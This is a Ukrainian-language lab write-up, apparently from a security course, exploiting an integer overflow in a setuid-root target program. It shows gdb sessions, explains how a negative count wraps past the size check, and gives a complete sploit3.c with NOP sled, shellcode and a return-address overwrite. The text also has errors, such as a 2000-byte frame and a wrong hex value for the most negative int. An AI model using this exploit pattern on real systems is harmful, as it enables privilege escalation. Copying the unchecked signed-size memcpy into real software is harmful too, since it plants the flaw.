# Integer overflow

Розглянемо /proj1/targets/target3.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct widget_t {
  double x;
  double y;
  int count;
};

#define MAX_WIDGETS 1000

int foo(char *in, int count)
{
  struct widget_t buf[MAX_WIDGETS];

  if (count < MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));
 

  return 0;
}

int main(int argc, char *argv[])
{
  int count;
  char *in;

  if (argc != 2)
    {
      fprintf(stderr, "target3: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);

  /*
   * format of argv[1] is as follows:
   *
   * - a count, encoded as a decimal number in ASCII
   * - a comma (",")
   * - the remainder of the data, treated as an array
   *   of struct widget_t
   */

  count = (int)strtoul(argv[1], &in, 10);
  if (*in != ',')
    {
      fprintf(stderr, "target3: argument format is [count],[data]\n");
      exit(EXIT_FAILURE);
    }
  in++;                         /* advance one byte, past the comma */
  foo(in, count);

  return 0;
}
```

_‌Лістинг 1: Вихідний код нашої програми target3.c для використання цілочисельних переповнень._

Якщо ми зможемо якось отримати контроль над ‘count  _sizeof \(struct widget\_t\)’ та ввести правильний розмір буфера, ми можемо ввести власний код. Але ми не можемо отримати count, що перевищує 999, через те, що ‘struct widget\_t buf \[MAX\_WIDGETS\]’ можемо мати лише ‘define MAX\_WIDGETS 1000’, це означає, що загальний розмір buf становить \( 1000_  20\) = 20000. Так як MAX\_WIDGETS = 1000 байт, struct widget\_t = 8 + 8 + 4 = 20 байт:

```text
double x = 8 байт
double y = 8 байт
int count = 4 байт
```

Проведем дослідження в gdb. Слід врахувати формат фактичного вводу, який становить , , де count - це кількість widget\_t, а data - це рядок вхідних даних. Кома використовується для того, щоб відокремити аргументи count і in \(data\) один від одного і не читається як in \(data\) завдяки оператору in++:

```bash
gdb ./target3
(gdb) break foo
Breakpoint 1 at 0x8048504: file target3.c, line 18.
(gdb) r 1,a
Starting program: /home/user/proj1/targets/target3 1,a

Breakpoint 1, foo (in=0xbffff81f "a", count=1) at target3.c:18
18    if (count < MAX_WIDGETS) 
(gdb) call count * sizeof(struct widget_t)
$1 = 20
```

_‌Лістинг 2: виконання target3 в gdb_

Тут:

```bash
count = 1
sizeof(struct widget_t) = 20
```

Наш фрейм функції foo виглядає так:

```text
4 bytes    [eip]
4 bytes    [ebp]
2000 bytes [buf]
```

Треба обманути \(count &lt; MAX\_WIDGETS\). Це можно зробити завдяки ціле числому \(int\) переповнюванню. Оскільки ціле число є фіксованим розміром 32 біти, існує фіксоване максимальне значення, яке воно може зберігати. Коли робиться спроба зберегти значення, яке перевищує це максимальне значення, це називається цілим переповненням. Стандарт ISO C99 говорить, що переповнення цілого числа спричиняє “невизначену поведінку”, тобто компілятори, що відповідають стандарту, можуть робити все, що завгодно, від повного ігнорування переповнення до переривання програми.

Для прикладу у нас є два цілих числа, a і b, довжина яких - 32 біти. Ми присвоюємо максимальному значенню, яке може містити 32-бітове ціле число:

Додаємо a і b разом і зберігаємо результат у третьому 32-розрядному цілому, що називається r:

```text
    a = 0xffffffff
    b = 0x1
    r = a + b
```

Тепер, оскільки результат додавання не може бути представлений за допомогою 32 бітів, результат, відповідно до стандарту ISO, зменшується за модулем 0x100000000

```text
r = (0xffffffff + 0x1)% 0x100000000
r = (0x100000000)% 0x100000000 = 0
```

Зменшення результату за допомогою модульної арифметики в основному гарантує, що використовуються лише найнижчі 32 біти результату, тому переповнення цілих чисел призводить до скорочення результату до розміру, який можна представити змінною. Це часто називають “обгортанням”, оскільки результат, здається, обертається до 0.

Також ми можемо фактично використовувати цілочисельну здатність “обертати” негативний цілочисельний спектр і отримувати позитивне “count \* sizeof \(struct widget\_t\)”, щоб переповнити його! Це все завдяки тому факту, що ми можемо помножити count на sizeof \(struct widget\_t\), що ми можемо це зробити. Попробуємо змінити count на –1:

```bash
(gdb) call count * sizeof(struct widget_t)
$2 = -20
```

_‌Лістинг 3: виконання target3 в gdb_

Тому що:

```bash
count * sizeof(struct widget_t) = -1 * 20 = -20
```

Отже ми можемо робити відьємним int и \(count &lt; MAX\_WIDGETS\) буде виконуватись. int32 має деапозон –2,147,483,647 \(–0x7FFFFC17\) to 2,147,483,647 \(0x7FFFFC17\). –2,147,483,647 є найбільш негативним числом, коли ми встановлюємо це для підрахунку, отримуємо:

```text
(gdb) set count = -2147482647
(gdb) call count * sizeof(struct widget_t)
$3 = 20020
```

_‌Лістинг 4: виконання target3 в gdb_

Тому що:

```text
((-0x7FFFFC17) * 0x14) % 0x100000000 = 0x4E34 = 20020
```

Або count = 4080219932

```text
(0xF333371C * 0x14) % 0x100000000 = 0x4E30 = 20016
```

Це виходить тому що коли помпілятор бере модуль старший модуль і удаляє старший байт, який потрібен для того щоб визначити позитивне та отрицтельне число. Наприклад:

```text
(0xF333371C * 0x14) = 0x1300004E30 =
0b1001100000000000000000100111000110000

(0xF333371C * 0x14) % 0x100000000 = 0x4E30 = 
0b100111000110000
```

Отже старшого байта не буде, ми переповнемо int та число буде позитивне:

```text
0x1300004E30
0x      4E30

0b1001100000000000000000100111000110000
0b                      100111000110000
```

Отже, count повинен бути –2147482647 або 4080219932. Це задовольнить оператор if у foo і дозволить нам переповнити buf.

Напишем sploit3 щоб заповнити буфер target3 та подивитись ардесу buf:

```c
int main(void)
{
    char buf[20004];
    char *count;
    int i;
    int addr;

    count = "999";
    for(i = 0; i < 20005; i++) {
      if(i < strlen(count)) {
        *(buf + i) = count[i];
      } else if(i < (strlen(count) + 1)) {
        *(buf + i) = ',';
      } else if(i < (20000 + strlen(count) + 1)) {
        *(buf + i) = 'a';
      }
    }

    char *args[] = { TARGET, buf, NULL };
    char *env[] = { NULL };

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
```

_‌Лістинг 5: sploit3.c_

```bash
user@vm-cs155:~/proj1/sploits$ gdb -e sploit3 -s /tmp/target3
(gdb) catch exec 
(gdb) r
(gdb) b foo
(gdb) c
(gdb) x buf
0xbfff6210: 0x00000000
```

_‌Лістинг 6: gdb_

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
    char buf[20004];
    char *count;
    int i;
    int addr;

    addr = 0xbfff6210;
    count = "-2147482647";
    for(i = 0; i < 20032; i++) {
      if(i < strlen(count)) {
        *(buf + i) = count[i];
      } else if(i < (strlen(count) + 1)) {
        *(buf + i) = ',';
      } else if(i < (20000 + strlen(count) + 1 - strlen(shellcode))) {
        *(buf + i) = '\x90';
      } else if(i < (20000 + strlen(count) + 1)) {
        *(buf + i) = shellcode[i - 20000 - strlen(count) - 1 + strlen(shellcode)];
      } else if(i < (20004 + strlen(count) + 1)) {
        *(buf + i) = '\x90';
      } else if(i < (20008 + strlen(count) + 1)) {
         *(buf + i) = addr >> ((i - 20000 - strlen(count) - 1) * 8);
      }
    }

    char *args[] = { TARGET, buf, NULL };
    char *env[] = { NULL };

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
```

_‌Лістинг 7: sploit3.c для виконання целочисельного переповнення_

